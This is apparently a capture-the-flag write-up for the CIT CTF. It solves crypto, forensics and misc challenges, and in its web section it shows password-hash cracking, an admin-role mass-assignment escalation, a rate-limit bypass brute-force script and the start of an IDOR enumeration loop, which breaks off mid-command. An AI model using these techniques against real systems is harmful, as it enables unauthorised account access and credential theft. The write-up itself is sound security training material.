<img width="763" height="175" alt="image" src="https://github.com/user-attachments/assets/b22777eb-20ae-4761-89f3-e8973a5a0b32" />

<img width="861" height="452" alt="image" src="https://github.com/user-attachments/assets/04805559-fcc7-41ff-8e7d-4ee48b9d3bdc" />


See link to the CTF page: https://ctf.cyber-cit.club/

---
## Welcome Section

There is a flag hidden on our LinkedIn page! Feel free to follow our page for updates :)

Page: https://www.linkedin.com/company/ctf-cit

<img width="812" height="816" alt="image" src="https://github.com/user-attachments/assets/2fb15337-407f-4db0-80eb-a075e994d9a0" />

There is base64 to decode:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# echo "Q0lUe3FJOTMxRkxwb0Rydn0=" | base64 -d 
CIT{qI931FLpoDrv}     
```

---
# Reversing

## Catacombs

This challenge exposed sensitive strings in a binary.

The solution to acquire the flag for this challenge:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# strings catacombs| grep -i "CIT{.*}"     
CIT{3R2rA2J0PdFH}
```

---
OSINT
--

Man these damn seagulls keep following me around… always in a flock, obnoxious sirens blaring. And they smell like pizza.

Feels like I’m being watched everywhere I go…

**FLAG FORMAT:** `CIT{Street_Name_City_Name_State}`

The city is **New Haven, CT**, famous for New Haven–style apizza. The legendary pizza street is **Wooster Street**, home to Frank Pepe's, Sally's Apizza, and others.

`CIT{Wooster_New_Haven_Connecticut}`

---
Crypto
--

## Braniac

This challenge provides a `challenge.txt` file.

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# file challenge.txt          
challenge.txt: ASCII text, with very long lines (454), with no line terminators
```

The contents:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat challenge.txt 
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>---.++++++.+++++++++++.>+++++++++++++++++++++++.<+++.+++++++++++++++++.<++++++++++++++++++++++++++++++++++.>>-------.<---------.++++++++++.+++++.---------------.>.<+++++++++.<-------------.>---------.>+++.<<---.>>-----.------.<+++++.-----.>---.<<------------.>.>+++++++++++.<+++++++++.<+++++++++++++.>>-.<---------.>-------.<<+++++++++++++++.>>++.-------.++++++++++++++.<<.>++++++++.<-------------.>>++++++++.  
```

This is "Brain Fuck" code - an esoteric programming language that only uses 8 characters (`+ - > < [ ] . ,`).

We can recognize this language and run it through an online interpreter or make a quick Python script to execute it and read the output.

Flag: `CIT{Wh@t_in_th3_w0rld_i$_th1s_l@ngu@g3}`

Script Solution that can take a file as an argument, otherwise defaults to challenge.txt:
```python
#!/usr/bin/env python3
"""Brainfuck interpreter - solves challenge.txt"""

import sys

def interpret(code):
    tape = [0] * 30000
    ptr = 0
    pc = 0
    output = []

    while pc < len(code):
        c = code[pc]
        if c == '>':
            ptr += 1
        elif c == '<':
            ptr -= 1
        elif c == '+':
            tape[ptr] = (tape[ptr] + 1) % 256
        elif c == '-':
            tape[ptr] = (tape[ptr] - 1) % 256
        elif c == '.':
            output.append(chr(tape[ptr]))
        elif c == '[':
            if tape[ptr] == 0:
                depth = 1
                while depth:
                    pc += 1
                    if code[pc] == '[':
                        depth += 1
                    elif code[pc] == ']':
                        depth -= 1
        elif c == ']':
            if tape[ptr] != 0:
                depth = 1
                while depth:
                    pc -= 1
                    if code[pc] == ']':
                        depth += 1
                    elif code[pc] == '[':
                        depth -= 1
        pc += 1

    return ''.join(output)


if __name__ == '__main__':
    path = sys.argv[1] if len(sys.argv) > 1 else 'challenge.txt'
    with open(path) as f:
        code = f.read()
    print(interpret(code))
```

## Rotor Rooter

Spin it till it drains

`KLEGCKRGGONTBNBVPIIZWXQQEZYAXXWQMGIZDNEWWUTOVZRWOMZKGWNKWZBQXOGZSTVCGU`

**FLAG FORMAT:** `CIT{underscore_between_each_word}`

---

Enigma Cipher Solution Given:
```
KLEGCKRGGONTBNBVPIIZWXQQEZYAXXWQMGIZDNEWWUTOVZRWOMZKGWNKWZBQXOGZSTVCGU
```

The Enigma machine has a huge key space (rotor selection, rotor order, ring settings, start positions, reflector, plugboard). With no plugboard assumed, we brute-force rotor choice + order + start position and score each candidate plaintext for English-likeness. A first pass with the default Wehrmacht rotor set (I II III, reflector B, position AAA) produced near-English output that was a well-known Alan Turing quote. A second pass then brute-forced the ring settings against that known plaintext to lock in the exact key.

Pass 1 — Rotor / Position Search
```python
from enigma.machine import EnigmaMachine
from itertools import permutations, product
import string, heapq

ct = "KLEGCKRGGONTBNBVPIIZWXQQEZYAXXWQMGIZDNEWWUTOVZRWOMZKGWNKWZBQXOGZSTVCGU"

WORDS = ["THE","AND","ING","ION","ENT","FOR","HAT","THA","HER","TER",
         "WAS","YOU","ITH","VER","ALL","WIT","THI","TIO"]

def score(s):
    return sum(s.count(w) * len(w) for w in WORDS)

rotors = ["I","II","III","IV","V"]
top = []

for refl in ["B","C"]:
    for rot in permutations(rotors, 3):
        for pos in product(string.ascii_uppercase, repeat=3):
            m = EnigmaMachine.from_key_sheet(
                rotors=' '.join(rot), reflector=refl,
                ring_settings=[0,0,0], plugboard_settings='')
            m.set_display(''.join(pos))
            pt = m.process_text(ct)
            sc = score(pt)
            if len(top) < 15:
                heapq.heappush(top, (sc, refl, ' '.join(rot), ''.join(pos), pt))
            else:
                heapq.heappushpop(top, (sc, refl, ' '.join(rot), ''.join(pos), pt))

for t in sorted(top, reverse=True):
    print(t)
```

Top hit (rotors I II III, reflector B, position AAA, ring AAA):
```
WECANONLYSEEASHORTDNHTANCEAHEADBUTWECANSEEPLEIGYTHERETHATNEEDSTOBEDONE
```

That's clearly the Turing quote _"We can only see a short distance ahead, but we can see plenty there that needs to be done"_ — just with two garbled pairs. Those glitches mean the ring setting is off.

Pass 2 — Ring Setting Search Against Known Plaintext:
```python
from enigma.machine import EnigmaMachine
from itertools import product
import string

ct = "KLEGCKRGGONTBNBVPIIZWXQQEZYAXXWQMGIZDNEWWUTOVZRWOMZKGWNKWZBQXOGZSTVCGU"
target = "WECANONLYSEEASHORTDISTANCEAHEADBUTWECANSEEPLENTYTHERETHATNEEDSTOBEDONE"

for rs in product(range(26), repeat=3):
    for pos in product(string.ascii_uppercase, repeat=3):
        m = EnigmaMachine.from_key_sheet(
            rotors='I II III', reflector='B',
            ring_settings=list(rs), plugboard_settings='')
        m.set_display(''.join(pos))
        pt = m.process_text(ct)
        if pt == target:
            print('ring=', rs, 'pos=', ''.join(pos))
            print(pt)
            raise SystemExit
```

**Recovered Settings**

|Parameter|Value|
|---|---|
|Rotors|I II III|
|Reflector|B|
|Ring settings|A A C (0, 0, 2)|
|Start position|A A C|
|Plugboard|(none)|

Plaintext message to construct flag as `CIT{each_word_separated}`

> WE CAN ONLY SEE A SHORT DISTANCE AHEAD BUT WE CAN SEE PLENTY THERE THAT NEEDS TO BE DONE
> 
> — Alan Turing, _Computing Machinery and Intelligence_ (1950)
## The Onion

Can you peel back the layers?

SHA1: 6ca8b4ae8d7317b27f564bc962a20b3e6fb49c72

NOTE: The answer you get will not have the CIT{} wrapper, make sure you add it to the final answer.

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat challenge.txt | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d |
base64 -d
b9486c74c779db5194d6508bebbee72b
```

<img width="868" height="274" alt="image" src="https://github.com/user-attachments/assets/3e3101a2-1940-458a-8696-094739213269" />

---
Forensics
--

## Baby Exponent

Classic small-exponent attack: since e=3 and the plaintext m is
   short enough that m^3 < n, no modular reduction happened —    
  just take the integer cube root of c.

```python
def iroot(x, n):
    if x < 0:
        raise ValueError
    if x == 0:
        return 0, True
    hi = 1
    while hi ** n <= x:
        hi *= 2
    lo = hi // 2
    while lo < hi:
        mid = (lo + hi) // 2
        if mid ** n < x:
            lo = mid + 1
        else:
            hi = mid
    return lo, lo ** n == x

n = 3975311104658158367804953186451876987828483822427305148759145730088615027289956528884778329789668637386484932183485546402292017850452360645365142100268336371204659887371551551598753305231985601246101574833959356250563521064956134365407699223
e = 3
c = 21208016443347524194488872231478291493949438339558450377152081476869432669496266457076405093626099218034592769060441274220970709748741037953818131469435699367735940032724483543045224740051080037

m, exact = iroot(c, 3)
print('exact cube root:', exact)
print('m =', m)

if exact:
    h = hex(m)[2:]
    if len(h) % 2:
        h = '0' + h
    print('flag:', bytes.fromhex(h).decode())
else:
    for k in range(0, 100000):
        cand = c + k * n
        r, ex = iroot(cand, 3)
        if ex:
            print('k =', k, 'm =', r)
            h = hex(r)[2:]
            if len(h) % 2:
                h = '0' + h
            print('flag:', bytes.fromhex(h).decode())
            break
```

This will create the flag.
## Dog Barking

We're given a `.wav` file. The goal is to recover a flag of the form `CIT{...}`:
```bash
$ file challenge.wav challenge.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 16000 Hz
```

The clip is ~77.8 s of mono 16 kHz PCM audio. Listening to it reveals no speech — just a sequence of short and long tones.

The spectrogram shows a rhythmic pattern of bursts, suggesting some kind of on/off-keyed or FSK modulation rather than hidden text in the frequency domain.
```bash
$ sox challenge.wav -n spectrogram -o spec.png
````

I extracted the amplitude envelope and thresholder it to find burst boundaries:
```python
import scipy.io.wavfile as w
import numpy as np

r, d = w.read('challenge.wav')
env = np.abs(d.astype(float))
sm = np.convolve(env, np.ones(320)/320, mode='same')
on = sm > sm.max()*0.08
trans = np.diff(on.astype(int))
starts = np.where(trans==1)[0]
ends   = np.where(trans==-1)[0]
```

This detected 269 bursts. Durations clustered around two values: ~115 ms and ~181 ms. The gaps between bursts were a consistent ~138 ms, so this isn't Morse (Morse needs variable inter-element spacing and a 3:1 dash:dot ratio — here the ratio is 1.57:1).

Running an FFT on each burst revealed three distinct frequency clusters, not two:

| Frequency | Duration | Count |
|-----------|----------|-------|
| 496 Hz    | ~115 ms  | 109   |
| 531 Hz    | ~123 ms  | 29    |
| 875 Hz    | ~181 ms  | 131   |

Three tones, 269 symbols. Straight binary decoding of the 269-symbol stream failed (269 is prime, doesn't split cleanly into bytes). The rare third tone is the hint: it's a separator.

Classify each burst by peak frequency and split the stream on the middle tone (B = 531 Hz):

```python
syms = []
for s, e in zip(starts, ends):
    seg = d[s:e].astype(float)
    pad = np.zeros(8192); pad[:len(seg)] = seg * np.hanning(len(seg))
    f = np.abs(np.fft.rfft(pad))
    pk = np.fft.rfftfreq(8192, 1/r)[np.argmax(f)]
    syms.append('A' if pk < 515 else 'B' if pk < 700 else 'C')

parts = ''.join(syms).split('B')
```

This gives 30 groups of exactly 8 symbols, confirming the separator hypothesis. Mapping `A→0`, `C→1` and reading each group as a byte:

```python
flag = ''.join(chr(int(p.replace('A','0').replace('C','1'), 2)) for p in parts)
print(flag)
```

The first four groups decode to:
```
ACAAAACC → 01000011 → 0x43 → 'C' ACAACAAC → 01001001 → 0x49 → 'I' ACACACAA → 01010100 → 0x54 → 'T' ACCCCACC → 01111011 → 0x7B → '{'
```

We can construct the flag: `CIT{b4rking_up_th3_wr0ng_tr33}`

**Takeaways:**
- Always count distinct tones before assuming binary FSK — the outlier cluster here was a delimiter.
- 269 being prime was the clue that the stream wasn't raw bit-packed ASCII; structural separators were carrying framing information.
- Once framed, the encoding was trivial: `A=0`, `C=1`, MSB-first, one byte per frame.
## Larping 101

To larp, one must become the larper..

What do you think of my presentation? It feels like it might be missing something so maybe you can tell me what it is?

We are provided a challenge.pptx file.

I tried to open it and was not successful so I renamed it to a `.zip` as it mentioned "archive", and running strings only showed powerpoint / XML readings:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# file challenge.zip
challenge.zip: Microsoft PowerPoint 2007+
```

If you do an unzip command you can find files like:
```bash
[Content_Types].xml
ppt/
docProps/
_rels/
```

There are slides, images, and `ppt/slides/transitions.xml` notably.

A means to discovering the flag:
```sh
mkdir -p /tmp/chal_extract
unzip -q /home/kali/Downloads/challenge.zip -d /tmp/chal_extract
grep -rn 'CIT{' /tmp/chal_extract
```

Legitimate PowerPoint files do **not** use a file called `ppt/slides/transitions.xml` — transition info lives inside each `slideN.xml`. This file was a hand-crafted decoy that PowerPoint ignores, with the flag tucked inside a fake `<p:debug><p:reserved>` block:
```xml
<p:debug>
    <p:log level="info">transition engine initialized</p:log>
    <p:log level="warning">compatibility mode enabled</p:log>
    <p:reserved>
        CIT{l4rp_l4rp_l4rp_s4hur}
    </p:reserved>
</p:debug>
```
## The Evil Files

Dr. Evil be dreamin and schemin

Attached is a challenge.pdf

We see text that is blacked out - we can highlight this and copy / paste to test if we can read it.

<img width="763" height="583" alt="image" src="https://github.com/user-attachments/assets/798c6323-f2f6-4a5a-937c-9faabb84ca46" />

We can read it and find the flag in the text:
```text
FROM: laser.shark.master@villainhq.net
TO: tiny.turmoil@domination.co
CC: CIT{m0j0_eng4g3d}
Subject: RE: Plan to take over the world
Date: Thur, 15 April 2026 07:30:12 +0000
Dear Minions,
After much contemplation and evil scheming, I have decided that phase one of My World Domination
Plan™ requires.. money. Lots of it. How much? I’m thinking $10 billion. No, wait.. $100 billion.
Actually.. let’s be safe and round up to $1 trillion!
You know what that means.. start practicing your evil laughs and your pinky-to-mouth poses. The
world will soon be mine.. and possibly slightly confused!
We’ve discussed phase one, but phase two requires a lot more funding. Our arsenal of gadgets must be
unparalleled. Current priorities include:
1. Shrink Ray 3000™ - because world leaders telling us “no” is unacceptable!
2. Sharks With Frickin’ Laser Beams Attached to their Heads – why not?
3. Automated Evil Minion Dispensers – we’ll need loyal assistants!
Prepare yourself, for soon the world will tremble at the sound of my monologue, the glint of my pinky,
and the sheer audacity of our plans. The time is nearly upon us. Success is inevitable. And, as always,
remember: no ransom too large, no evil laugh too loud.
Pinky raised,
Dr. Purrington
```

The flag is on the CC line: `CIT{m0j0_eng4g3d}`

---
Misc
--

## Call me, maybe - No... wrong decade

I don't have a witty description for this one...
```
$2b$10$Ni0U3D5ibg1NY6G/k8CDHuXG7m/WNZzuV/9PDPnRzgKs4wUjaTwGO
```

We can write this BCRYPT hash to a file to use with hash cat:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# echo '$2b$10$Ni0U3D5ibg1NY6G/k8CDHuXG7m/WNZzuV/9PDPnRzgKs4wUjaTwG' > hash.txt 
```

Then we can crack this to get the flag.
## ## Help! I've forgotten my password and I can't login!

Can you recover the password to my Keepass database, I will forever be in your debt.

We can see this is a Keepass database:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# file Database.kdbx                                    
Database.kdbx: Keepass password database 2.x KDBX
```

Search online for "Jumbo John", the elevated version of John The Ripper to be able to handle this type of file.

We can create a hash with John The Ripper: 
```bash
┌──(root㉿kali)-[/home/kali/Downloads/john]
└─# ./run/keepass2john /home/kali/Downloads/Database.kdbx > /home/kali/Downloads/keepass.hash
```

John The Ripper:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# john/run/john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Downloads/keepass.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 128/128 SSE2])
Cost 1 (t (rounds)) is 600000 for all loaded hashes
Cost 2 (m) is 0 for all loaded hashes
Cost 3 (p) is 0 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
Will run 8 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that's fine)
0g 0:00:01:49 0.30% (ETA: 00:03:43) 0g/s 475.9p/s 475.9c/s 475.9C/s steven18..spike01
0g 0:00:10:42 1.65% (ETA: 00:46:16) 0g/s 432.2p/s 432.2c/s 432.2C/s bubblegum0..bubble08
0g 0:00:10:49 1.67% (ETA: 00:45:58) 0g/s 432.2p/s 432.2c/s 432.2C/s a33333..a1234b
0g 0:00:10:51 1.67% (ETA: 00:45:44) 0g/s 432.4p/s 432.4c/s 432.4C/s HARRYP..HAIRSPRAY
0g 0:00:11:10 1.73% (ETA: 00:44:21) 0g/s 433.8p/s 433.8c/s 433.8C/s thenet..theking123
0g 0:00:12:33 1.97% (ETA: 00:33:27) 0g/s 440.0p/s 440.0c/s 440.0C/s theocrox..themommy
0g 0:00:12:36 1.98% (ETA: 00:32:50) 0g/s 440.3p/s 440.3c/s 440.3C/s steph2009..stembayo
0g 0:00:18:40 3.01% (ETA: 00:17:39) 0g/s 447.1p/s 447.1c/s 447.1C/s jhonedwar..jhon18
0g 0:00:20:14 3.29% (ETA: 00:11:52) 0g/s 450.0p/s 450.0c/s 450.0C/s 62604..62506
0g 0:00:24:38 4.04% (ETA: 00:06:19) 0g/s 451.9p/s 451.9c/s 451.9C/s dory14..dortch
0g 0:00:26:05 4.29% (ETA: 00:04:54) 0g/s 451.9p/s 451.9c/s 451.9C/s Ladygirl..LaVonne1
0g 0:00:26:12 4.31% (ETA: 00:04:46) 0g/s 452.0p/s 452.0c/s 452.0C/s Daisuke1..DYLAN11
0g 0:00:28:45 4.63% (ETA: 00:17:30) 0g/s 443.9p/s 443.9c/s 443.9C/s trilla1..trilia
0g 0:00:31:56 5.18% (ETA: 00:13:15) 0g/s 444.3p/s 444.3c/s 444.3C/s monkey916..monkey698
0g 0:00:32:12 5.22% (ETA: 00:13:48) 0g/s 443.8p/s 443.8c/s 443.8C/s mickie3..mickeyrocks
0g 0:00:38:16 5.96% (ETA: 00:39:13) 0g/s 423.8p/s 423.8c/s 423.8C/s deanda1..deana11
0g 0:00:43:40 6.53% (ETA: 01:05:43) 0g/s 405.7p/s 405.7c/s 405.7C/s 97grga..97999667
0g 0:00:45:23 6.68% (ETA: 01:16:07) 0g/s 400.6p/s 400.6c/s 400.6C/s 301660..301603
tra358ja         (Database)     
1g 0:00:51:57 DONE (2026-04-18 14:49) 0.000321g/s 386.8p/s 386.8c/s 386.8C/s traash..tra358ja
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we can enumerate the keepass DB:
```bash
Flags> ls "/Recycle Bin"
Sample Entry
Sample Entry #2
Flags> ls /General
Instagram
Flags> ls /Network
[empty]
Flags> ls /Internet
[empty]
Flags> ls /eMail
[empty]
Flags> ls /Homebanking
Bank of America
```

Finding the flag:
```bash
Flags> show -s "/Homebanking/Bank of America"
Title: Bank of America
UserName: lol-you-thought
Password: CIT{Th@nks_4_r3cover1ng_my_p@$$w0rd}
URL: 
Notes: 
Uuid: {2e05fbbf-d22a-cf4d-9d7a-4e6cf10ce8f5}
Tags: 
Flags> 
```
## SAM, I am

Prompt:
```
I dumped the SAM hive and found a document stating the password policy is 5 characters + complexity

97a3e51e5a006eccac91e0ceabd4965b
```

This is an NTLM hash. We can approach this via Hashcat or use crackstation, for simplcity - here is Crackstation.

<img width="871" height="353" alt="image" src="https://github.com/user-attachments/assets/0e344087-7ac4-4dcc-9b45-2432956f75bb" />

The flag here is: `cit{C1t!!}`

---
Web Application Exploitation
--

## A Massive Problem

On the source code of the target page inside of the `<script>` field we have a register form, that is valuable to find a `/api/register` endpoint.
```html
<script>
const form = document.getElementById('registerForm')
const statusBox = document.getElementById('status')
form.addEventListener('submit', async (e) => {
  e.preventDefault()
  statusBox.textContent = ''
  const payload = Object.fromEntries(new FormData(form).entries())
  const res = await fetch('/api/register', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(payload)
  })
  const data = await res.json()
  if (!res.ok) {
    statusBox.textContent = data.error || 'Unable to create account.'
    return
  }
  window.location.href = data.redirect || '/login'
})
</script>
```

A new user can be created by sending a JSON payload to the `/api/register` endpoint. The password must meet the policy requirements:

- 8+ characters
- Uppercase
- Lowercase
- Number
- Symbol

<img width="716" height="811" alt="image" src="https://github.com/user-attachments/assets/8607df21-9965-4fa4-84df-80baec7e011b" />

Example request:
```bash
POST /api/register HTTP/1.1
Host: 23.179.17.92:5556
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://23.179.17.92:5556/
Content-Type: application/json
Content-Length: 94
Origin: http://23.179.17.92:5556
Connection: keep-alive
Priority: u=0

{
	"full_name":"eric",
	"username":"ericeric",
	"title":"eric",
	"team":"eric",
	"password":"P@ssw0rd!"
}
```

Intercepting the request to follow where it goes.

A successful registration returns:
```json
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.13
Date: Fri, 17 Apr 2026 22:34:36 GMT
Content-Type: application/json
Content-Length: 22
Vary: Cookie
Set-Cookie: session=.eJwty7EJgEAMQNFVQmpxADtnsLKSEIMGNZG7HCLi7irY_eK_C6nEPJiHsmBz4SY50_Qm9l4SHJ6WvBMLELMXC9AMSWg8a-h0MlCDcGC3UCtSY4WhsX6-_QG_e8iI9_0Ab64m5g.aeK1fA.jfr9Y312QVu0PS2Q7yjwsImUh98; HttpOnly; Path=/
Connection: close

{"redirect":"/login"}

```

<img width="665" height="742" alt="image" src="https://github.com/user-attachments/assets/01ea5b17-f9a8-41a2-aa07-5fee15947ac8" />

Logging into the account we created and intercepting this in Burpsuite.

<img width="872" height="312" alt="image" src="https://github.com/user-attachments/assets/fbce2384-da65-4768-9600-4bebda0ae249" />

This redirects to the `/dashboard` page. We can follow that too.

Capture the session cookie in the above screenshot:
```text
eyJyb2xlIjoic3RhbmRhcmQiLCJ1c2VybmFtZSI6ImVyaWNlcmljIn0.aeK2fA.9ViuLKaUhFvYZhhFZzjJuAJi60g
```

We can decode the part before the first `.`: 
```
┌──(root㉿kali)-[/home/kali/CTF@CIT]
└─# echo "eyJyb2xlIjoic3RhbmRhcmQiLCJ1c2VybmFtZSI6ImVyaWNlcmljIn0" | base64 -d
{"role":"standard","username":"ericeric"}    
```

This is a Flask session cookie; signed but not encrypted. We can read the contents but we can't forge a new cookie without the secret key. We need to change the server-side role. 

The `role` field is important — it determines user privileges.

Forward the rests in the proxy in order to reach the dashboard.

<img width="866" height="584" alt="image" src="https://github.com/user-attachments/assets/e036cc17-1802-423c-b1d2-205421b73d67" />

Click on the profile link on the dashboard. You will see a form to edit your name, title, and team.

<img width="865" height="585" alt="image" src="https://github.com/user-attachments/assets/60a4228a-f66d-405a-93db-389c505d2a69" />

Fill in any values and click save changes. In Burp, the request is intercepted or appears in HTTP history.

<img width="869" height="469" alt="image" src="https://github.com/user-attachments/assets/f5825956-71bf-481a-8a60-c84c13b0b306" />

> Do not forward yet until you modify the body in the next step. If you already forwarded it, right-click the request in HTTP history and choose send to repeater instead.

This is where we can inject the role `admin` in the JSON body.

> This can be achieved via intercept or done with repeater to see the outcome comparisons too, without losing request chain.

<img width="873" height="361" alt="image" src="https://github.com/user-attachments/assets/7b961603-90da-47c3-8978-a21835e5e786" />

We can see that we received a redirect to login. Now we can login again for an admin session cookie with the same credentials.

When we catch a new login cookie we see the admin role:
```bash
┌──(root㉿kali)-[/home/kali/CTF@CIT]
└─# echo "eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImVyaWNlcmljIn0" | base64 -d
{"role":"admin","username":"ericeric"}
```

Now we can navigate to the URL with `/admin` appended to the end and replace the field that appears for the session with our cookie from that newest session:
```bash
Cookie: session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImVyaWNlcmljIn0.aeK59A.4tUcco0JqSOO-rsIuCyLA427pik
```

Now we can see the admin console and acquire the flag in the response:

<img width="868" height="448" alt="image" src="https://github.com/user-attachments/assets/eda4cde4-9ab4-4b7a-8484-93b9fd68875b" />

## Debug Disaster

Developing this application is tough, and I needed debug mode to be enabled... but I'm nervous I forgot to turn it off in production. I also think I may have forgot to remove something from the application structure.

<img width="869" height="259" alt="image" src="https://github.com/user-attachments/assets/64992323-4864-487e-9db3-e4ea155cd295" />

You see a minimal target when you intercept the page:

<img width="871" height="263" alt="image" src="https://github.com/user-attachments/assets/d2b11ed5-d531-4b16-9477-e37107a560ab" />

We can fuzz for other pages (`robots.txt` was not available).

Enumerating other directories:
```bash
┌──(root㉿kali)-[/home/kali/CTF@CIT]
└─# gobuster dir -u http://23.179.17.92:5002/ -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://23.179.17.92:5002/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 500) [Size: 14304]
/console              (Status: 400) [Size: 167]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The other page with a 400 error yields nothing.

The first page with a 500:

<img width="885" height="654" alt="image" src="https://github.com/user-attachments/assets/60a9def4-6e52-43fe-bb6c-d90203788f75" />

Instead of a generic "500 Internal Server Error", you get a rich, colorful Werkzeug debugger page with a full Python stack trace. 

This confirms debug=True is set in production. The traceback shows every frame from Flask internals down to the application code.

You can click on the debug page to find fields that include actual Python code. Among these is a route to `/flg_bar` which we could visit!

<img width="879" height="561" alt="image" src="https://github.com/user-attachments/assets/b93a73f4-6b6e-416c-9885-b90916132aab" />

Here is the flag for this challenge:

<img width="671" height="242" alt="image" src="https://github.com/user-attachments/assets/6b619ec1-d2ad-41b5-ad49-c75e70f40235" />

## Hit Your Limit!

When we arrive on this page we have an input field that will monitor rate limiting.

<img width="866" height="734" alt="image" src="https://github.com/user-attachments/assets/f062518c-488c-4a33-a68f-bc1530501089" />

In the source code of the page we can see that the application provides an API at `/api/flag?guess=X` that tells you if your guess is a correct prefix of the 32-character flag.

This has a rate limit of 5 requests per 300 seconds per source IP.

The rate limiter itself is applied to the path `/api/flag` but not to `/api/flag/` (with a trailing slash). Flask will still route both to the same handler, so the trailing slash bypasses the rate limiting entirely, allowing unlimited character-by-character brute force.

<img width="704" height="414" alt="image" src="https://github.com/user-attachments/assets/6fd6aa27-006e-4e8c-a331-b74efb31aed8" />

We can test the logic this way in burp suite Repeater to start:

<img width="873" height="290" alt="image" src="https://github.com/user-attachments/assets/b8ba2c01-7357-497f-872a-e7b4b5573e4a" />

So we know the flags are all CIT{} and this will be 32 characters. So that solves part of the problem and we can get validation on what works or does not work.

The rate limiting is still an issue though:

<img width="872" height="254" alt="image" src="https://github.com/user-attachments/assets/a67eb7ba-b4e7-4af0-a7a1-f7107f6a7533" />

To bypass the rate limiting we can add this trailing slash:

<img width="512" height="138" alt="image" src="https://github.com/user-attachments/assets/197d3a10-dd42-4bee-a191-ffb9e301ae3e" />

Now that this is brute-force friendly and we know what we're looking for (e.g. correct) we can create a Python script to brute force this.

```python
#!/usr/bin/env python3
"""Rate-limit bypass + prefix oracle brute force."""

import requests
import string

TARGET = "http://TARGET:5559"
charset = string.ascii_letters + string.digits + "@_!#${}"
known = "CIT{"

while len(known) < 32:
    for c in charset:
        guess = known + c
        r = requests.get(
            f"{TARGET}/api/flag/",   # ← trailing slash bypass
            params={"guess": guess}
        )
        if r.status_code == 200 and r.json().get("result") == "correct":
            known = guess
            print(f"[{len(known):2d}/32] {known}")
            break

print(f"\nFLAG: {known}")
```

The results of the brute forcing script:
```bash
┌──(root㉿kali)-[/home/kali/CTF@CIT]
└─# ./rate.py 
[ 5/32] CIT{R
[ 6/32] CIT{R@
[ 7/32] CIT{R@T
[ 8/32] CIT{R@T3
[ 9/32] CIT{R@T3_
[10/32] CIT{R@T3_L
[11/32] CIT{R@T3_L1
[12/32] CIT{R@T3_L1m
[13/32] CIT{R@T3_L1m1
[14/32] CIT{R@T3_L1m1t
[15/32] CIT{R@T3_L1m1t1
[16/32] CIT{R@T3_L1m1t1n
[17/32] CIT{R@T3_L1m1t1nG
[18/32] CIT{R@T3_L1m1t1nG_
[19/32] CIT{R@T3_L1m1t1nG_1
[20/32] CIT{R@T3_L1m1t1nG_15
[21/32] CIT{R@T3_L1m1t1nG_15_
[22/32] CIT{R@T3_L1m1t1nG_15_B
[23/32] CIT{R@T3_L1m1t1nG_15_By
[24/32] CIT{R@T3_L1m1t1nG_15_Byp
[25/32] CIT{R@T3_L1m1t1nG_15_Bypa
[26/32] CIT{R@T3_L1m1t1nG_15_Bypas
[27/32] CIT{R@T3_L1m1t1nG_15_Bypass
[28/32] CIT{R@T3_L1m1t1nG_15_Bypass@
[29/32] CIT{R@T3_L1m1t1nG_15_Bypass@b
[30/32] CIT{R@T3_L1m1t1nG_15_Bypass@bl
[31/32] CIT{R@T3_L1m1t1nG_15_Bypass@ble
[32/32] CIT{R@T3_L1m1t1nG_15_Bypass@ble}

FLAG: CIT{R@T3_L1m1t1nG_15_Bypass@ble}
```
## Intern Portal

The intern said they made a custom report application... but I don't think security was in mind.

We can create an account here:

<img width="674" height="601" alt="image" src="https://github.com/user-attachments/assets/780285fa-7360-4d43-8334-c7c634453a22" />

After making a user and password of `test123:test123` I was able to reach this:

<img width="870" height="483" alt="image" src="https://github.com/user-attachments/assets/639fc3c7-f63f-4852-aee8-645e2f314045" />

So we can create a report and see what happens next.

We can probably increment or decrement this report for an IDOR vulnerability:

<img width="863" height="335" alt="image" src="https://github.com/user-attachments/assets/7d8eecc3-03b7-4251-8ec2-a01dbc335707" />

Doing that will give us "Fake Reports"

<img width="863" height="268" alt="image" src="https://github.com/user-attachments/assets/45d840d6-5d3a-4efb-92c2-885dc1feb90d" />

We can probably make a script to evaluate the contents of that field and avoid anything such as "Fake report"

You can approach this from three angles:
1. Create a curl one-liner
2. Python brute forcing
3. Burp Intruder

Curl one-liner:
```bash
COOKIE="session=YOUR_SESSION_COOKIE"
for id in $(seq 1 500); do
  content=$(curl -s -b "$COOKIE" \
